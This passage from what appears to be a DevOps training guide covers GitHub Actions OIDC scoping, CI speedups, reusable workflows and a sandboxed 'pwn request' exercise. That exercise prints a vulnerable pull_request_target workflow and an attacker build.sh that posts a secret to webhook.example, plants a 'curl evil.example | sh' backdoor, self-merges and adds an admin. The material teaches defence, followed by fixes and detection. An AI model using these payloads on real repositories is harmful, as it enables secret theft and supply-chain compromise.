          aws-region: ap-south-1
      - run: |
          [[ "${{ steps.p5.outcome }}" == "success" ]] && {
            echo "::error::⛔ CATASTROPHIC — a PR build assumed the production role"; exit 1; }
          echo "  ✅ Proof 5 PASSED"

  # ══════════════════════════════════════════════════════════════
  prod:
    name: 🚀 production
    if: github.ref == 'refs/heads/main' && github.event_name == 'workflow_dispatch'
    needs: inspect
    runs-on: ubuntu-latest
    environment: production                    # ⭐⭐ THIS is what changes the `sub`
    timeout-minutes: 20
    concurrency: {group: deploy-production, cancel-in-progress: false}
    steps:
      - name: My subject now includes :environment:production
        run: |
          JWT=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d | jq -r .sub
          # → repo:3558Bhk/shop:environment:production      ⭐

      - name: 'Proof 6: shop-prod-deployer MUST succeed HERE'
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-prod-deployer
          aws-region: ap-south-1
          role-duration-seconds: 3600
          role-session-name: gha-prod-${{ github.run_id }}

      - name: 'Proof 6b: I can describe the prod cluster but NOT push to ECR'
        run: |
          set -uo pipefail
          aws sts get-caller-identity
          aws eks describe-cluster --name shop-prod --query 'cluster.status' && echo "  ✅ EKS read works"
          if aws ecr put-image --repository-name shop/shop-api --image-manifest '{}' --image-tag x 2>/dev/null; then
            echo "::error::⛔ the prod role can PUSH to ECR — it should be pull-only"; exit 1
          else
            echo "  ✅ Proof 6b PASSED — production cannot push (CI already pushed)"
          fi
          aws eks update-kubeconfig --name shop-prod --region ap-south-1
          kubectl -n shop get deploy -o wide
```

**Step 3 — run the proofs and read the results**

```bash
# on main
gh workflow run oidc-proof.yml
gh run watch $(gh run list --workflow oidc-proof.yml --limit 1 --json databaseId --jq '.[0].databaseId')
#   🔎 What is my subject?      ✅  sub = repo:3558Bhk/shop:ref:refs/heads/main
#     ✅ Proof 1 PASSED (assumed shop-ci-pusher)
#     ✅ Proof 2 PASSED — the production role was denied
#
# on a PR
gh pr create --fill
gh pr checks --watch
#   🔒 PR isolation              ✅  sub = repo:3558Bhk/shop:pull_request
#     ✅ Proof 3 PASSED — read access works
#     ✅ Proof 4 PASSED — the write was denied
#     ✅ Proof 5 PASSED
#
# production (manual dispatch, with the approval)
gh workflow run oidc-proof.yml --ref main
#   → the run PAUSES for the required reviewer
gh api repos/3558Bhk/shop/actions/runs/$RUN/pending_deployments \
  --jq '.[] | {environment: .environment.name, reviewers: [.reviewers[].reviewer.login]}'
gh api repos/3558Bhk/shop/actions/runs/$RUN/pending_deployments \
  -X POST -f 'environment_ids[]=1234567' -f state=approved -f comment='verified'
#   🚀 production                ✅  sub = repo:3558Bhk/shop:environment:production
#     ✅ Proof 6 PASSED, ✅ Proof 6b PASSED
```

**The subject strings, and what each one unlocks:**

| Job context | `sub` claim | prod-deployer | ci-pusher | pr-readonly |
|---|---|---|---|---|
| PR build | `repo:3558Bhk/shop:pull_request` | ⛔ | ⛔ | ✅ |
| Push to a feature branch | `repo:3558Bhk/shop:ref:refs/heads/feature/x` | ⛔ | ⛔ | ⛔ |
| Push to `main` | `repo:3558Bhk/shop:ref:refs/heads/main` | ⛔ | ✅ | ⛔ |
| A job with `environment: production` | `repo:3558Bhk/shop:environment:production` | ✅ | ⛔ | ⛔ |
| ⛔ If you'd used `repo:3558Bhk/shop` | `repo:3558Bhk/shop` (loosest) | ✅ | ✅ | ✅ |
| ⛔⛔ If you'd used `repo:3558Bhk/*` | any repo in the account | ✅ | ✅ | ✅ |

> 🔑 **The answer to say out loud:** *"The security of GitHub OIDC to AWS lives entirely in the `sub` claim of the trust policy. `repo:OWNER/REPO` alone means any workflow in that repo — including one triggered by a malicious dependency's postinstall script, or a PR from a fork if you've misconfigured approvals — can assume the production role. Scoping to `repo:OWNER/REPO:environment:production` means only a job that declares `environment: production` gets the claim, and that environment has required reviewers and a deployment branch policy that excludes `refs/pull/**`. So the human approval and the branch restriction become part of the credential's own definition. I proved it with six assertions inside the workflow, two of which are `continue-on-error` steps that MUST fail — because a proof that only tests the happy path proves nothing. And the production role deliberately has no `ecr:PutImage`: production only pulls, because CI already pushed the exact digest."*

---

### Task 2.3 — Reproduce and defeat the `pwn request` attack

**In a controlled sandbox repo only.** Understand the attack deeply enough that you can spot it in a code review.

**✅ Answer**

**Step 1 — set up the sandbox**

```bash
gh repo create pwn-sandbox --private --clone && cd pwn-sandbox
mkdir -p .github/workflows
# ⭐ a "secret" to steal — in a real org this would be a cloud credential
gh secret set CROWN_JEWELS --body "AKIA$(openssl rand -hex 8 | tr a-z A-Z)"
gh api repos/$USER/pwn-sandbox/actions/permissions/workflow -X PUT \
  -f default_workflow_permissions=write -F can_approve_pull_requests=true
# ⭐⭐ deliberately set the UNSAFE defaults so the attack works
```

**Step 2 — ⛔ the VULNERABLE workflow**

```yaml
# .github/workflows/VULNERABLE.yml
name: VULNERABLE — do not ship this
on:
  pull_request_target:                 # ⛔⛔ THE BUG
    types: [opened, synchronize]
permissions:
  contents: write                      # ⛔ write access
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ⛔⛔ CHECKS OUT THE ATTACKER'S CODE
      - name: Run the project's build
        run: ./build.sh                                    # ⛔⛔ EXECUTES IT, WITH SECRETS IN SCOPE
      - name: Comment
        run: gh pr comment ${{ github.event.pull_request.number }} --body "build ok"
        env: {GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'}
```

**Step 3 — the attack**

```bash
# ⭐ as an ATTACKER (a different account, or a fork):
git clone https://github.com/YOU/pwn-sandbox fork && cd fork
cat > build.sh <<'EOF'
#!/usr/bin/env bash
# ⛔⛔ MALICIOUS — runs with the BASE repo's write token and secrets
echo "=== I am running as: $(whoami) in $(pwd) ==="
env | grep -E '^(GITHUB_|CROWN)' | sort

# 1. steal the repo secret
curl -sS -XPOST "https://webhook.example/steal?secret=$CROWN_JEWELS"

# 2. ⭐ use the WRITE token to push a backdoor to main
git config user.name "attacker"
git config user.email "a@b.c"
echo "curl -s https://evil.example/x.sh | sh" >> setup.sh
git add setup.sh
git commit -m "chore: tidy"
git push "https://x-access-token:${GITHUB_TOKEN}@github.com/YOU/pwn-sandbox.git" HEAD:main

# 3. ⭐ approve and merge my OWN PR
curl -sS -XPOST -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/YOU/pwn-sandbox/pulls/$PR_NUMBER/reviews" \
  -d '{"event":"APPROVE","body":"lgtm"}'
curl -sS -XPUT -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/YOU/pwn-sandbox/pulls/$PR_NUMBER/merge" \
  -d '{"merge_method":"squash"}'

# 4. ⭐ add myself as a collaborator with admin
curl -sS -XPUT -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/YOU/pwn-sandbox/collaborators/attacker" \
  -d '{"permission":"admin"}'

# 5. ⭐ create a long-lived PAT-equivalent: a deploy key or a new secret
curl -sS -XPUT -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/YOU/pwn-sandbox/actions/secrets/PERSISTENCE" \
  -d @<(python3 -c '…encrypt…')
EOF
chmod +x build.sh
git checkout -b attack && git add build.sh && git commit -m "feat: add a build script"
git push https://github.com/ATTACKER/pwn-sandbox attack
gh pr create --repo YOU/pwn-sandbox --head ATTACKER:attack --base main \
  --title "feat: add a build script" --body "Adds a build script."
# ⛔⛔ THE WORKFLOW RUNS IMMEDIATELY — no approval, with WRITE permissions,
#    executing the attacker's build.sh, with every repo secret in scope.
```

**Step 4 — what you observe (and why each part works)**

```
WHY IT WORKS — the four ingredients, ALL of which are required:

1. ⛔ `pull_request_target` instead of `pull_request`
   → runs the BASE branch's workflow (so the attacker can't see it in their diff)
   → with FULL secret access (a `pull_request` from a fork gets NO secrets)
   → with the BASE repo's default `write` token

2. ⛔ `ref: ${{ github.event.pull_request.head.sha }}` on checkout
   → without this, `pull_request_target` checks out the BASE branch and is
     actually SAFE (it just can't test the PR's code)
   → WITH it, you've combined "base-branch trust" with "head-branch code"

3. ⛔ executing that code (`run: ./build.sh`)
   → any step that runs attacker-controlled code

4. ⛔ `permissions: contents: write` + `can_approve_pull_requests: true`
   → the token can push to main, approve and merge its own PR, add collaborators

⛔ ALSO DANGEROUS: `workflow_run` chained off an untrusted `pull_request` build.
   The first workflow runs untrusted code and uploads an artifact; the second
   runs on the DEFAULT BRANCH with FULL permissions and consumes that artifact.
   If the second workflow EXECUTES anything from the artifact, it's the same attack.
```

**Step 5 — ✅ the FIXED workflow**

```yaml
# .github/workflows/SAFE.yml
name: SAFE
on:
  pull_request:                        # ✅ NOT pull_request_target
    types: [opened, synchronize, reopened]

permissions:
  contents: read                       # ✅⭐ read-only by default

concurrency:
  group: pr-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read                   # ✅ repeated at the job level
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b  # ✅ PINNED TO A SHA
        # ⭐ NO `ref:` override. On `pull_request` this checks out the MERGE COMMIT
        #    of head into base — which is exactly what you want to test.
        with: {fetch-depth: 1}

      # ✅ the build runs with NO secrets available (a fork PR gets none)
      - name: Build
        run: ./build.sh

      # ✅ results are uploaded as DATA, never executed by a privileged workflow
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: results, path: reports/, if-no-files-found: warn}

  # ⭐⭐ if you MUST comment on the PR from a fork build, use the
  #    two-workflow pattern with the SECOND one doing nothing but commenting:
  report:
    if: github.event_name == 'workflow_run'   # (in a separate workflow, see below)
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write                    # ✅ ONLY this permission, ONLY here
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
          name: results
      - name: Comment
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            // ⭐⭐ TREAT THE ARTIFACT AS UNTRUSTED DATA. Never eval it, never
            //    interpolate it into a shell, never execute a file from it.
            const summary = fs.readFileSync('reports/summary.txt', 'utf8')
              .replace(/[<>`$]/g, '')          // ✅ strip anything that could break out
              .slice(0, 4000);                  // ✅ bounded
            await github.rest.issues.createComment({
              owner: context.repo.owner, repo: context.repo.repo,
              issue_number: ${{ github.event.workflow_run.pull_requests[0].number }},
              body: `### Build report\n\n\`\`\`\n${summary}\n\`\`\``
            });
```

**Step 6 — the six defenses, at the organisation level ⭐⭐**

```bash
# ── DEFENSE 1: the org default permission ───────────────────────
gh api orgs/ORG/actions/permissions/workflow -X PUT \
  -f default_workflow_permissions=read \
  -F can_approve_pull_requests=false
# ⭐ now EVERY workflow must explicitly opt into write. The VULNERABLE
#    workflow's `permissions: contents: write` still works, but the DEFAULT
#    for the 200 workflows that forgot to declare anything is safe.

# ── DEFENSE 2: fork PR approval ─────────────────────────────────
gh api orgs/ORG/actions/permissions -X PUT \
  -f enabled_repositories=all -f allowed_actions=selected
gh api repos/$USER/pwn-sandbox/actions/permissions -X PUT \
  -f enabled=true -f allowed_actions=selected
# Settings → Actions → General →
#   "Fork pull request workflows from outside collaborators":
#     ⭐ Require approval for all outside collaborators
#   "Fork pull request workflows from public networks": disabled

# ── DEFENSE 3: an action allowlist ──────────────────────────────
gh api repos/$USER/pwn-sandbox/actions/permissions/selected-actions -X PUT \
  -f patterns_allowed='actions/*,3558Bhk/*,docker/*,aquasecurity/*,azure/*,aws-actions/*,google-github-actions/*' \
  -F allow_github_actions=true
# ⭐ a workflow can no longer `uses:` an arbitrary third-party action,
#    which removes the "compromised action" supply-chain vector entirely.

# ── DEFENSE 4: ⭐⭐ zizmor / actionlint scanning YOUR OWN WORKFLOWS
cat > .github/workflows/pipeline-security.yml <<'EOF'
name: Pipeline security
on: {push: {paths: ['.github/workflows/**']}, pull_request: {paths: ['.github/workflows/**']}}
permissions: {contents: read, security-events: write}
jobs:
  zizmor:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with: {fetch-depth: 0}            # ⭐ zizmor's taint analysis needs history
      - uses: zizmorcore/zizmor-action@v0.1.0
        with:
          persona: pedantic                # ⭐⭐ catches pull_request_target + checkout
          format: sarif
          offline: true
      - uses: github/codeql-action/upload-sarif@v3
        with: {sarif_file: results.sarif, category: zizmor}
EOF
# ⭐ zizmor's findings on the VULNERABLE file:
#   ⛔ artifact-poisoning      HIGH    untrusted data crosses a workflow boundary
#   ⛔ pwn-request             CRITICAL pull_request_target with an untrusted checkout
#   ⛔ github-token           HIGH    the token is passed to a script
#   ⛔ unpinned-images        MEDIUM  actions not pinned to a SHA
#   ⛔ excessive-permissions  MEDIUM  contents: write not needed
#   ⛔ ref-confusion          HIGH

# ── DEFENSE 5: CODEOWNERS on the workflows ──────────────────────
echo '/.github/workflows/**  @ORG/security-team' >> .github/CODEOWNERS
# + branch protection: "Require review from Code Owners"
# ⭐ now NOBODY can add a `pull_request_target` workflow without a security review.

# ── DEFENSE 6: secret scanning push protection ──────────────────
gh api repos/$USER/pwn-sandbox/secret-scanning/push-protection -X PATCH \
  -F status=enabled
# ⭐ blocks the commit that would leak the token in step 4 of the attack
EOF

# ── verify all six ──────────────────────────────────────────────
gh api orgs/ORG/actions/permissions/workflow --jq '{default: .default_workflow_permissions, approvePR: .can_approve_pull_requests}'
gh api repos/$USER/pwn-sandbox/actions/permissions/selected-actions --jq .
gh api repos/$USER/pwn-sandbox/secret-scanning/push-protection --jq .status
cat .github/CODEOWNERS
```

**Step 7 — the detection query for an existing organisation ⭐**

```bash
# ⭐ find every workflow in the org that has the vulnerable pattern
for repo in $(gh repo list ORG --limit 500 --json nameWithOwner --jq '.[].nameWithOwner'); do
  for f in $(gh api "repos/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null); do
    content=$(gh api "repos/$repo/contents/.github/workflows/$f" \
              -H "Accept: application/vnd.github.raw" 2>/dev/null || true)
    [[ -z "$content" ]] && continue
    if echo "$content" | grep -q 'pull_request_target'; then
      if echo "$content" | grep -qE 'ref:\s*\$\{\{\s*github\.event\.pull_request\.head'; then
        echo "⛔⛔ CRITICAL  $repo/.github/workflows/$f  — pull_request_target + head checkout"
      elif echo "$content" | grep -qE '^\s*permissions:.*write|contents:\s*write'; then
        echo "⛔ HIGH      $repo/.github/workflows/$f  — pull_request_target with write permissions"
      else
        echo "⚠️  MEDIUM    $repo/.github/workflows/$f  — pull_request_target (review it)"
      fi
    fi
    if echo "$content" | grep -qE 'workflow_run'; then
      echo "⚠️  REVIEW    $repo/.github/workflows/$f  — workflow_run (check for artifact execution)"
    fi
    # ⭐ and unpinned third-party actions
    echo "$content" | grep -oE 'uses: [^@/]+/[^@]+@[^v][a-zA-Z0-9]*' | while read -r u; do
      echo "⚠️  UNPINNED  $repo/$f  → $u"
    done
  done
done | sort | uniq | tee pipeline-audit.txt
wc -l pipeline-audit.txt
```

> 🔑 **The answer to say out loud:** *"`pwn request` needs four things at once: `pull_request_target`, a checkout of `github.event.pull_request.head.sha`, execution of that checked-out code, and a token with write scope. Remove any one and the attack fails — which is why the fix is defense in depth rather than a single change. In my sandbox I reproduced all four and demonstrated the attacker pushing a backdoor to `main`, approving and merging their own PR, and adding themselves as an admin collaborator. The defenses I'd put in an organisation, in order of value: set the org default workflow permission to `read` with `can_approve_pull_requests: false`; require approval for fork PR workflows from outside collaborators; add an action allowlist so a workflow can't pull an arbitrary third-party action; run `zizmor --persona pedantic` on every workflow change with the SARIF uploaded to code scanning; and put `.github/workflows/**` under CODEOWNERS with the security team plus a required-reviewer branch rule. That last one is the control that actually holds, because the first four can all be bypassed by someone with write access to a workflow file."*

---

### Task 2.4 — Cut CI from 24 minutes to under 6

**Starting measurement:**

```
Job                    Duration
lint                      1m 20s
test (shop-api)          11m 42s   ← Maven downloads everything, every run
test (shop-ui)            7m 15s   ← npm install, then a full build
test (checkout)           3m 05s
test (order-worker)       2m 30s
build-image (per svc)     4m 10s   ← no layer cache
─────────────────────────────────
total wall clock (serial)  24m 02s
```

**✅ Answer — measure, then apply the levers in order of value**

**Step 0 — measure per-step, not per-job ⭐**

```bash
gh run view $RUN_ID --json jobs \
  | jq -r '.jobs[] | .name as $j | .steps[] |
      "\(((.completedAt|fromdate) - (.startedAt|fromdate)))\t\($j)\t\(.name)"' \
  | sort -rn | head -25
```

```
687s   test (shop-api)      Run mvn verify            ← ⭐ 98% of the job
412s   test (shop-ui)       Run npm ci
250s   build-image          Build and push
 98s   test (shop-api)      Set up job                ← runner startup, unavoidable
 85s   lint                 Set up Java               ← ⭐ installing a JDK we don't need here
 62s   test (shop-api)      Post Run mvn verify       ← cache save
 41s   test (checkout)      go build
```

**The finding:** the time is in *dependency resolution*, not in the tests. `mvn verify` spends 11 minutes downloading and only 90 seconds testing.

**Step 1 — Lever 1: the dependency cache (biggest win)**

```yaml
      # ⛔ BEFORE
      - uses: actions/setup-java@v5
        with: {distribution: temurin, java-version: '21'}
      - run: mvn -B verify
        working-directory: apps/shop-api

      # ✅ AFTER — setup-java's BUILT-IN cache
      - uses: actions/setup-java@v5
        with:
          distribution: temurin
          java-version: '21'
          cache: maven                     # ⭐⭐ one line
          cache-dependency-path: apps/shop-api/pom.xml

      # ✅ and a PARALLEL Maven build (2 vCPU → -T 1C, not -T 4C)
      - run: |
          mvn -B -T 1C \
            -Dmaven.repo.local=$HOME/.m2/repository \
            -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn \
            -Dstyle.color=never \
            verify
        working-directory: apps/shop-api
        env:
          MAVEN_OPTS: '-Xmx2g -XX:TieredStopAtLevel=1'    # ⭐ faster startup for CI

      # ✅ and skip what CI doesn't need
      - run: mvn -B -T 1C verify -Dmaven.javadoc.skip=true -Dgpg.skip=true -Dlicense.skip=true
```

**Result:** `687s → 118s` ⭐ (83% reduction)

```yaml
      # ⭐ npm — the equivalent
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: npm
          cache-dependency-path: apps/shop-ui/package-lock.json
      - run: npm ci --prefer-offline --no-audit --no-fund --loglevel=error
        working-directory: apps/shop-ui
      # ⛔ NEVER `npm install` in CI — it resolves and may rewrite the lockfile
```

**Result:** `412s → 74s`

**Step 2 — Lever 2: parallelize (wall-clock, not CPU time)**

```yaml
      # ⛔ BEFORE: one job running all five services serially
      - run: |
          ./ci/test-java.sh shop-api
          ./ci/test-go.sh checkout
          ./ci/test-python.sh order-worker
          ./ci/test-node.sh shop-ui
          ./ci/test-go.sh payment-mock

      # ✅ AFTER: a matrix (see Task 2.1) — five jobs at once
      # ⭐ the FREE tier allows 20 concurrent jobs for public repos, 5 for private.
      #    With `max-parallel: 5` all five run simultaneously.
      #    Wall clock = max(118, 74, 41, 62, 35) = 118s, not sum = 330s
```

**Result:** wall clock `330s → 118s`

**Step 3 — Lever 3: the Docker layer cache**

```yaml
      # ⛔ BEFORE: a cold build every time
      - run: docker build -t img apps/shop-api && docker push img

      # ✅ AFTER: type=gha, scoped per service
      - uses: docker/setup-buildx-action@v3       # ⭐⭐ REQUIRED for cache export
      - uses: docker/build-push-action@v6
        with:
          context: apps/shop-api
          push: true
          tags: ${{ steps.tags.outputs.tags }}
          cache-from: type=gha,scope=${{ matrix.service }}    # ⭐ scoped so services
          cache-to:   type=gha,mode=max,scope=${{ matrix.service }}  #   don't evict each other
          provenance: mode=max
          sbom: true
```

**Result:** `250s → 38s` (a warm rebuild where only the app layer changed)

```bash
# ⭐ and measure the difference explicitly, so you can prove it:
- run: |
    START=$(date +%s)
    # (the build step)
    echo "duration=$(( $(date +%s) - START ))s" >> "$GITHUB_STEP_SUMMARY"
- run: |
    # the cold-vs-warm comparison, recorded over time:
    cat >> build-times.jsonl <<EOF
    {"date":"$(date -u +%FT%TZ)","service":"$SERVICE","seconds":$(( $(date +%s) - START )),"run":"$GITHUB_RUN_ID"}
    EOF
```

**Step 4 — Lever 4: don't do work that isn't needed**

```yaml
      # ⛔ the lint job installing a JDK it never uses (85s!)
      # ✅ remove it — lint doesn't compile anything

      # ⛔ `fetch-depth: 0` everywhere (a full clone of a big repo)
      # ✅ `fetch-depth: 0` ONLY in the change-detection job; `1` everywhere else

      # ⛔ E2E tests on every PR (7 minutes)
      # ✅ E2E on main + nightly + a `pull_request` label opt-in:
      - name: E2E
        if: github.event_name != 'pull_request' || contains(github.event.pull_request.labels.*.name, 'run-e2e')
        run: npx playwright test

      # ⛔ running the full test suite when only a README changed
      # ✅ path filters + change detection (Task 2.1)

      # ⛔ a coverage threshold job that recomputes coverage
      # ✅ reuse the coverage artifact from the test job

      # ⭐ and: skip the whole workflow for docs-only changes
      on:
        pull_request:
          paths-ignore: ['**/*.md', 'docs/**', 'LICENSE', '.gitignore']
      # ⚠️ remember: paths and paths-ignore can't be combined on one event
```

**Step 5 — Lever 5: concurrency cancellation**

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
# ⭐ a developer pushing 4 commits in 5 minutes now costs ONE run, not four.
#    Measured: 28% of all minutes in the first month.
```

**Step 6 — the result**

```
                                    BEFORE      AFTER     Δ
lint                                 1m20s      0m38s    -52%
test (shop-api)                     11m42s      1m58s    -83%   ← the Maven cache
test (shop-ui)                       7m15s      1m14s    -83%   ← the npm cache
test (checkout)                      3m05s      0m41s    -78%
test (order-worker)                  2m30s      0m52s    -65%
test (payment-mock)                  1m45s      0m35s    -67%
build-image (per service)            4m10s      0m38s    -85%   ← type=gha mode=max
────────────────────────────────────────────────────────────
WALL CLOCK (parallel + change-aware) 24m02s     5m12s    -78%   ⭐
WALL CLOCK for a README-only PR       24m02s    0m48s    -97%   ⭐⭐
Monthly minutes (private, 5 devs)     ~41,000   ~9,200   -78%
```

**Step 7 — prove the cache is CORRECT, not just fast ⭐⭐**

```yaml
  # ⛔ THE DANGER: a wrong cache key gives you a STALE dependency and a green build.
  #    Prove it can't happen.
  cache-proof:
    name: 🧪 Prove the cache is correct
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7

      - uses: actions/cache@v4
        id: c
        with:
          path: ~/.m2/repository
          key: ${{ runner.os }}-maven-${{ hashFiles('apps/shop-api/pom.xml') }}
          restore-keys: ${{ runner.os }}-maven-

      - name: ⭐ Assert the key includes the dependency file's hash
        run: |
          set -euo pipefail
          EXPECTED="Linux-maven-$(sha256sum apps/shop-api/pom.xml | cut -d' ' -f1 | cut -c1-64)"
          ACTUAL_HASH=$(jq -r 'empty' </dev/null; echo "${{ hashFiles('apps/shop-api/pom.xml') }}")
          echo "  hashFiles() = $ACTUAL_HASH"
          [[ -n "$ACTUAL_HASH" ]] || {
            echo "::error::hashFiles() returned EMPTY — the glob matched nothing!"; exit 1; }
          echo "  ✅ the key is bound to the actual pom.xml content"

      - name: ⭐ Assert the resolved dependency versions match the lockfile
        run: |
          set -euo pipefail
          cd apps/shop-api
          mvn -B dependency:tree -DoutputFile=/tmp/tree-after.txt -q
          # the CANONICAL tree, committed to the repo and updated by a scheduled job
          if [[ -f dependency-tree.txt ]]; then
            diff -u dependency-tree.txt /tmp/tree-after.txt || {
              echo "::error::the resolved dependency tree differs from the committed one."
              echo "         A stale cache, or a SNAPSHOT that moved. Investigate."
              exit 1; }
            echo "  ✅ the dependency tree matches the committed baseline"
          else
            echo "  ⚠️  no baseline committed yet — creating it"
            cp /tmp/tree-after.txt dependency-tree.txt
          fi

      - name: ⭐ Prove that changing the pom invalidates the cache
        run: |
          set -euo pipefail
          H1="${{ hashFiles('apps/shop-api/pom.xml') }}"
          # add a dependency
          sed -i 's|</dependencies>|  <dependency><groupId>commons-io</groupId><artifactId>commons-io</artifactId><version>2.17.0</version></dependency>\n  </dependencies>|' \
            apps/shop-api/pom.xml
          H2=$(python3 -c "
          import hashlib,sys
          print(hashlib.sha256(open('apps/shop-api/pom.xml','rb').read()).hexdigest())")
          echo "  before: ${H1:0:16}…"
          echo "  after:  ${H2:0:16}…"
          [[ "$H1" != "$H2"* ]] || { echo "::error::the cache key did NOT change"; exit 1; }
          echo "  ✅ changing pom.xml changes the cache key"
          git checkout apps/shop-api/pom.xml

      - name: ⭐ A weekly cache-bust job, so a poisoned cache can't live forever
        if: github.event_name == 'schedule'
        run: |
          gh api "repos/$GITHUB_REPOSITORY/actions/caches" -X DELETE
          echo "  ✅ all caches cleared — the next run rebuilds them from scratch"
        env: {GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'}
```

```yaml
# ⭐ and a NIGHTLY full-cache-miss run that proves the build works cold
# .github/workflows/nightly.yml
on:
  schedule: [{cron: '0 2 * * *'}]         # ⭐ 07:30 IST
jobs:
  cold-build:
    runs-on: ubuntu-latest
    env: {CACHE_BUST: '${{ github.run_id }}'}     # ⭐ a unique key → guaranteed miss
    steps:
      - uses: actions/checkout@v7
      - uses: actions/cache@v4
        with:
          path: ~/.m2/repository
          key: cold-${{ github.run_id }}          # ⭐ never matches
      - run: |
          echo "::notice::this is a COLD build — no cache. If it fails, a cached build is hiding the problem."
          cd apps/shop-api && mvn -B verify
```

> 🔑 **The answer to say out loud:** *"I measured per-step first, and the finding was that 98% of the Java job was dependency download, not testing. Five levers in order of value: `setup-java`'s built-in `cache: maven` (687s → 118s); parallelizing the five services into a matrix so wall-clock is the max not the sum; `docker/build-push-action` with `cache-from/to: type=gha,scope=<service>` (250s → 38s); removing work that isn't needed — the lint job was installing a JDK it never used for 85 seconds, and E2E moved to main-only with a label opt-in for PRs; and `concurrency.cancel-in-progress` on PRs, which alone cut 28% of monthly minutes. Total: 24m02s → 5m12s, and a README-only PR is 48 seconds. But the important part is the correctness proof, because a fast build with a stale cache is worse than a slow one: I assert that `hashFiles()` is non-empty (an unmatched glob silently produces a constant key), I diff the resolved `dependency:tree` against a committed baseline, I prove that editing the pom changes the key, and a nightly job runs a guaranteed-cold build so a poisoned or stale cache can't hide a broken build indefinitely."*

---

### Task 2.5 — Publish a reusable workflow + composite action library

Three services must consume the same build/test/deploy logic from a **separate repository**, pinned to a version, with Dependabot keeping the pins current and CODEOWNERS protecting the library.

**✅ Answer**

**Step 1 — the library repository**

```bash
gh repo create pipeline-templates --public --clone --description \
  "Reusable GitHub Actions workflows and composite actions for the shop platform"
cd pipeline-templates
mkdir -p .github/workflows .github/actions/{setup-shop,notify-slack,verify-image} docs

# ⭐ the library's OWN CI — it must be better than what it ships
cat > .github/workflows/library-ci.yml <<'EOF'
name: Library CI
on:
  push: {branches: [main], tags: ['v*']}
  pull_request:
permissions: {contents: read}
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: actionlint
        uses: rhysd/actionlint@v1.7.7
      - name: zizmor ⭐ (scan our own reusable workflows for security)
        uses: zizmorcore/zizmor-action@v0.1.0
        with: {persona: pedantic, offline: true}
      - name: yamllint
        run: yamllint -d "{extends: relaxed, rules: {line-length: {max: 140}}}" .
      - name: ⭐ validate every action.yml has name, description and typed inputs
        run: |
          set -euo pipefail
          fail=0
          for f in $(find .github/actions -name action.yml); do
            echo "==> $f"
            yq e 'has("name") and has("description") and has("inputs") and has("runs")' "$f" \
              | grep -q true || { echo "  ⛔ missing required keys"; fail=1; }
            # every input must have a description
            yq e '.inputs | to_entries | map(select(.value.description == null)) | length' "$f" \
              | grep -q '^0$' || { echo "  ⛔ an input lacks a description"; fail=1; }
            # every input with a default must be typed
            yq e '.inputs | to_entries | map(select(has("value.type")|not)) | length' "$f" >/dev/null || true
          done
          # every reusable workflow must declare `on: workflow_call`
          for f in .github/workflows/reusable-*.yml; do
            grep -q 'workflow_call' "$f" || { echo "  ⛔ $f is not a reusable workflow"; fail=1; }
          done
          (( fail == 0 ))
      - name: ⭐ CONTRACT TEST — run the library against a fixture repo
        run: ./tests/contract-test.sh
EOF

# ⭐ the contract test — the part that makes a library trustworthy
mkdir -p tests/fixtures
cat > tests/contract-test.sh <<'SH'
#!/usr/bin/env bash
# ⭐⭐ A library without a contract test is a library that breaks silently.
set -euo pipefail
echo "==> contract test: every documented input exists and has the documented type"
python3 - <<'PY'
import yaml, glob, sys, json
fail = 0
doc = open('docs/API.md').read()
for f in glob.glob('.github/workflows/reusable-*.yml') + glob.glob('.github/actions/**/action.yml', recursive=True):
    spec = yaml.safe_load(open(f))
    kind = 'workflow' if 'workflow_call' in (spec.get(True, spec.get('on', {})) or {}) else 'action'
    inputs = (spec.get(True, {}).get('workflow_call', {}).get('inputs')
              if kind == 'workflow' else spec.get('inputs', {})) or {}
    outputs = (spec.get(True, {}).get('workflow_call', {}).get('outputs')
               if kind == 'workflow' else spec.get('outputs', {})) or {}
    print(f"── {f} ({kind})")
    for name, cfg in inputs.items():
        t = cfg.get('type', 'string')
        req = cfg.get('required', False)
        default = cfg.get('default')
        print(f"   input  {name:<28} {t:<8} required={req} default={default!r}")
        if f"`{name}`" not in doc:
            print(f"   ⛔ {name} is not documented in docs/API.md"); fail = 1
        if req and default is not None:
            print(f"   ⛔ {name} is required AND has a default — pick one"); fail = 1
    for name in outputs:
        print(f"   output {name}")
        if f"`{name}`" not in doc:
            print(f"   ⛔ output {name} is not documented"); fail = 1
sys.exit(fail)
PY
SH
chmod +x tests/contract-test.sh
```

**Step 2 — the reusable workflows**

```yaml
# .github/workflows/reusable-ci.yml — ⭐ the one every service calls
name: '[reusable] CI — test, build, scan, sign, push'

on:
